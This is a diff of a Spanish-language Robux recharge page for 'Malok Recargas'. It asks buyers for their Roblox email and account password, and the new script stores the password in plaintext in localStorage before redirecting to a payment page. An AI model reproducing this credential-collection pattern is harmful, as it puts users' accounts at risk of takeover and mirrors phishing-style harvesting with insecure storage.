@@ -4,192 +4,180 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Recargar Robux - Malok Recargas</title>
-    <link rel="stylesheet" href="./style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-    <link rel="shortcut icon" href="./img/malok.webp" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="shortcut icon" href="images/malok_logo.png" type="image/x-icon">
 </head>
 <body>
     <header>
         <div class="header-left">
-            <a href="index.html">
-                <img src="./img/malok.webp" alt="Malok Recargas Logo" class="logo-img">
+            <a href="index.html" class="logo-link">
+                <img src="images/malok_logo.png" alt="Malok Recargas Logo" class="logo-img">
             </a>
         </div>
         <div class="header-right">
             <div class="search-bar">
+                <input type="text" placeholder="Buscar juego...">
                 <i class="fas fa-search"></i>
-                <input type="text" placeholder="Buscar juego o servicio...">
             </div>
-            <div class="custom-currency-selector" id="currency-selector">
-                <div class="selected-currency">
-                    <img src="./img/bandera_ve.webp" alt="Venezuela Bandera" id="selected-flag">
-                    <span id="selected-text">Venezuela VES</span>
-                    <i class="fas fa-chevron-down"></i>
+            <div class="custom-currency-selector" id="custom-currency-selector">
+                <div class="selected-currency" id="selected-currency">
+                    <img src="images/flag_ve.png" alt="Venezuela Flag"> <span>Bs. (VES)</span> <i class="fas fa-chevron-down"></i>
                 </div>
-                <div class="currency-options">
-                    <div class="option" data-currency="VES" data-flag="./img/bandera_ve.webp" data-text="Venezuela VES">
-                        <img src="./img/bandera_ve.webp" alt="Venezuela Bandera"> <span>Venezuela VES</span>
+                <div class="currency-options" id="currency-options">
+                    <div class="option" data-value="VES">
+                        <img src="images/flag_ve.png" alt="Venezuela Flag"> <span>Bs. (VES)</span>
                     </div>
-                    <div class="option" data-currency="USD" data-flag="./img/bandera_usa.webp" data-text="USA USD">
-                        <img src="./img/bandera_usa.webp" alt="USA Bandera"> <span>USA USD</span>
-                    </div>
-                    <div class="option" data-currency="COP" data-flag="./img/bandera_co.webp" data-text="Colombia COP">
-                        <img src="./img/bandera_co.webp" alt="Colombia Bandera"> <span>Colombia COP</span>
+                    <div class="option" data-value="USD">
+                        <img src="images/flag_us.png" alt="USA Flag"> <span>$ (USD)</span>
                     </div>
                 </div>
             </div>
         </div>
     </header>
 
-    <main>
-        <section class="form-container">
-            <img src="./img/roblox_banner.webp" alt="Banner de Roblox" class="game-banner">
-            <h2>Recarga de Robux</h2>
-            <form id="recharge-form">
-                <div class="input-group">
-                    <label for="robloxEmail">Correo de Roblox:<span class="required-star">*</span></label>
-                    <input type="email" id="robloxEmail" name="robloxEmail" placeholder="ejemplo@correo.com" required>
-                </div>
-                <div class="input-group">
-                    <label for="robloxPassword">Contraseña de Roblox:<span class="required-star">*</span></label>
-                    <input type="password" id="robloxPassword" name="robloxPassword" placeholder="Ingresa tu contraseña" required>
-                </div>
-                
-                <h3>Selecciona tu Paquete</h3>
-                <p class="small-text">Los precios se muestran en la moneda seleccionada.</p>
-                <div class="package-list" id="package-list">
-                    </div>
-                
-                <h3>Resumen del Pedido</h3>
-                <div class="transaction-summary">
-                    <p>Paquete: <strong id="selected-package-summary">Aún no seleccionado</strong></p>
-                    <p>Total: <strong id="final-price">0.00 VES</strong></p>
-                </div>
-
-                <button type="submit" class="btn-primary" id="submit-btn" disabled>Finalizar Recarga</button>
-            </form>
-        </section>
-    </main>
-
-    <footer>
-        <div class="footer-content">
-            <p>&copy; 2025 Malok Recargas. Todos los derechos reservados.</p>
-            <div class="footer-links">
-                <a href="#">Sobre Nosotros</a>
-                <a href="#">Política de Privacidad</a>
-                <a href="#">Términos y Condiciones</a>
-                <a href="#">Contacto</a>
+    <main class="roblox-main">
+        <div class="form-container">
+            <img src="images/roblox_banner.jpg" alt="Roblox Banner" class="game-banner">
+            <h2>Recargar Robux</h2>
+            <div class="game-info">
+                <p>Moneda actual: <span id="currency-display">USD</span></p>
+                <p>Ingresa tus datos de Roblox.</p>
             </div>
-            <a href="https://wa.me/tunumerodewhatsapp" class="whatsapp-link" target="_blank">
-                <i class="fab fa-whatsapp"></i>Habla con nosotros
-            </a>
-        </div>
-    </footer>
 
-    <script src="./js/common.js"></script>
-    <script src="./js/roblox.js"></script>
-</body>
-</html>                        <img src="assets/images/flag-colombia.png" alt="Bandera de Colombia">
-                        <span>COP</span>
-                    </div>
-                    <div class="option" data-currency="VES">
-                        <img src="assets/images/flag-venezuela.png" alt="Bandera de Venezuela">
-                        <span>VES</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </header>
-
-    <main>
-        <div class="game-recharge-container">
-            <img src="assets/images/roblox-banner.webp" alt="Banner de Roblox" class="game-banner">
-
-            <section class="form-container">
-                <h1>Recarga de Robux</h1>
-                <p>Ingresa tus datos y selecciona tu paquete de Robux.</p>
-
+            <form id="roblox-recharge-form">
                 <div class="form-group">
-                    <div class="input-group">
-                        <label for="robloxEmail">Correo de Roblox: <span class="required-star">*</span></label>
-                        <input type="email" id="robloxEmail" name="robloxEmail" placeholder="ejemplo@correo.com" required>
-                    </div>
-                    <div class="input-group">
-                        <label for="robloxPassword">Contraseña de Roblox: <span class="required-star">*</span></label>
-                        <input type="password" id="robloxPassword" name="robloxPassword" placeholder="Ingresa tu contraseña" required>
-                    </div>
+                    <label for="roblox-email">1. Ingresa tu Correo de Roblox:</label>
+                    <input type="email" id="roblox-email" name="robloxEmail" placeholder="ejemplo@correo.com" required>
                 </div>
-
-                <h2>Selecciona tu Paquete</h2>
-                <p class="small-text">Los precios se muestran en la moneda seleccionada.</p>
+                <div class="form-group">
+                    <label for="roblox-password">2. Ingresa tu Contraseña de Roblox:</label>
+                    <input type="password" id="roblox-password" name="robloxPassword" placeholder="Ingresa tu contraseña" required>
+                </div>
                 
-                <div class="package-list">
+                <div class="form-group">
+                    <label>3. Selecciona tus Robux:</label>
+                    <div class="package-list" id="package-list">
                     </div>
-
-                <div class="transaction-summary">
-                    <p>Resumen del Pedido</p>
-                    <p>Paquete: <strong id="summary-package">Aún no seleccionado</strong></p>
-                    <p>Total: <strong id="summary-total">0.00 VES</strong></p>
                 </div>
 
-                <button id="proceedToPayment" class="btn-primary" disabled>Finalizar Recarga</button>
-            </section>
+                <button type="submit" class="btn-primary" id="confirm-recharge-btn" disabled>Confirmar Recarga</button>
+            </form>
         </div>
     </main>
 
     <footer>
         <div class="footer-content">
-            <div class="footer-links">
-                <a href="about.html">Sobre Nosotros</a>
-                <a href="privacy.html">Política de Privacidad</a>
-                <a href="terms.html">Términos y Condiciones</a>
-                <a href="contact.html">Contacto</a>
-            </div>
-            <a href="https://wa.me/tunumerodewhatsapp" class="whatsapp-link" target="_blank">
-                <i class="fab fa-whatsapp"></i> Habla con nosotros
-            </a>
             <p>&copy; 2025 Malok Recargas. Todos los derechos reservados.</p>
+            <div class="footer-links">
+                <a href="privacy.html">Políticas de Privacidad</a>
+                <a href="terms.html">Términos de Servicio</a>
+            </div>
+            <a href="https://wa.me/584126949631" target="_blank" class="whatsapp-link">
+                <i class="fab fa-whatsapp"></i> Contáctanos por WhatsApp
+            </a>
         </div>
     </footer>
 
-    <script src="assets/js/currency-selector.js"></script>
-    <script src="assets/js/common-recharge.js"></script>
+    <script src="script.js"></script>
     <script>
+        // Paquetes de Robux con precios en USD y VES fijos
+        const robloxPackages = [
+            { id: 1, name: '400 Robux', priceUSD: 4.99, priceVES: 175.00 },
+            { id: 2, name: '800 Robux', priceUSD: 9.99, priceVES: 350.00 },
+            { id: 3, name: '1700 Robux', priceUSD: 19.99, priceVES: 700.00 },
+            { id: 4, name: '4500 Robux', priceUSD: 49.99, priceVES: 1750.00 },
+            { id: 5, name: '10000 Robux', priceUSD: 99.99, priceVES: 3500.00 }
+        ];
+
         document.addEventListener('DOMContentLoaded', () => {
-            const gameData = {
-                game: 'Roblox',
-                imagePath: 'assets/images/roblox-banner.webp',
-                inputIds: ['robloxEmail', 'robloxPassword'],
-                priceKey: 'price',
-                packages: {
-                    'Robux': {
-                        'USD': [
-                            { name: '400 Robux', value: 400, price: 4.99 },
-                            { name: '800 Robux', value: 800, price: 9.99 },
-                            { name: '1700 Robux', value: 1700, price: 19.99 },
-                            { name: '4500 Robux', value: 4500, price: 49.99 },
-                            { name: '10000 Robux', value: 10000, price: 99.99 }
-                        ],
-                        'VES': [
-                            { name: '400 Robux', value: 400, price: 175.00 },
-                            { name: '800 Robux', value: 800, price: 350.00 },
-                            { name: '1700 Robux', value: 1700, price: 700.00 },
-                            { name: '4500 Robux', value: 4500, price: 1750.00 },
-                            { name: '10000 Robux', value: 10000, price: 3500.00 }
-                        ],
-                        'COP': [
-                            { name: '400 Robux', value: 400, price: 20000.00 },
-                            { name: '800 Robux', value: 800, price: 40000.00 },
-                            { name: '1700 Robux', value: 1700, price: 80000.00 },
-                            { name: '4500 Robux', value: 4500, price: 200000.00 },
-                            { name: '10000 Robux', value: 10000, price: 400000.00 }
-                        ]
-                    }
-                }
-            };
+            const emailInput = document.getElementById('roblox-email');
+            const passwordInput = document.getElementById('roblox-password');
+            const packageListDiv = document.getElementById('package-list');
+            const confirmBtn = document.getElementById('confirm-recharge-btn');
+            const currencyDisplaySpan = document.getElementById('currency-display');
             
-            // Llamar a la función principal de common-recharge
-            initializeRechargePage(gameData);
+            let selectedPackage = null;
+
+            function formatPrice(price, currency) {
+                if (currency === 'VES') {
+                    return `Bs. ${price.toFixed(2)}`;
+                } else {
+                    return `$${price.toFixed(2)}`;
+                }
+            }
+
+            function updatePackages(currentCurrency) {
+                currencyDisplaySpan.textContent = currentCurrency;
+                packageListDiv.innerHTML = '';
+                robloxPackages.forEach(pkg => {
+                    let displayPrice = (currentCurrency === 'VES') ? pkg.priceVES : pkg.priceUSD;
+                    const packageItem = document.createElement('div');
+                    packageItem.classList.add('package-item');
+                    packageItem.dataset.id = pkg.id;
+                    packageItem.dataset.priceUsd = pkg.priceUSD;
+                    packageItem.dataset.priceVes = pkg.priceVES;
+                    packageItem.innerHTML = `
+                        <span>${pkg.name}</span>
+                        <span class="price">${formatPrice(displayPrice, currentCurrency)}</span>
+                    `;
+                    packageItem.addEventListener('click', () => {
+                        if (selectedPackage) {
+                            selectedPackage.classList.remove('selected');
+                        }
+                        packageItem.classList.add('selected');
+                        selectedPackage = packageItem;
+                        checkFormValidity();
+                    });
+                    packageListDiv.appendChild(packageItem);
+                });
+                checkFormValidity();
+            }
+
+            function checkFormValidity() {
+                const emailValid = emailInput.value.trim() !== '';
+                const passwordValid = passwordInput.value.trim() !== '';
+                confirmBtn.disabled = !(emailValid && passwordValid && selectedPackage);
+            }
+
+            const initialCurrency = localStorage.getItem('selectedCurrency') || 'VES';
+            updatePackages(initialCurrency);
+
+            emailInput.addEventListener('input', checkFormValidity);
+            passwordInput.addEventListener('input', checkFormValidity);
+
+            window.addEventListener('currencyChanged', (event) => {
+                const newCurrency = event.detail.currency;
+                updatePackages(newCurrency);
+            });
+
+            document.getElementById('roblox-recharge-form').addEventListener('submit', (e) => {
+                e.preventDefault();
+                if (selectedPackage) {
+                    const robloxEmail = emailInput.value.trim();
+                    const robloxPassword = passwordInput.value.trim();
+                    const packageName = selectedPackage.querySelector('span:first-child').textContent;
+                    const basePriceUSD = parseFloat(selectedPackage.dataset.priceUsd);
+                    const basePriceVES = parseFloat(selectedPackage.dataset.priceVes);
+                    const selectedCurrency = localStorage.getItem('selectedCurrency') || 'VES';
+                    const finalPrice = (selectedCurrency === 'VES') ? basePriceVES : basePriceUSD;
+                    
+                    const transactionDetails = {
+                        game: "Roblox",
+                        robloxEmail: robloxEmail,
+                        robloxPassword: robloxPassword,
+                        package: packageName,
+                        priceUSD: basePriceUSD.toFixed(2),
+                        finalPrice: finalPrice.toFixed(2),
+                        currency: selectedCurrency
+                    };
+
+                    localStorage.setItem('transactionDetails', JSON.stringify(transactionDetails));
+                    window.location.href = 'payment.html';
+                } else {
+                    console.error('Por favor, selecciona un plan de recarga.');
+                }
+            });
         });
     </script>
 </body>
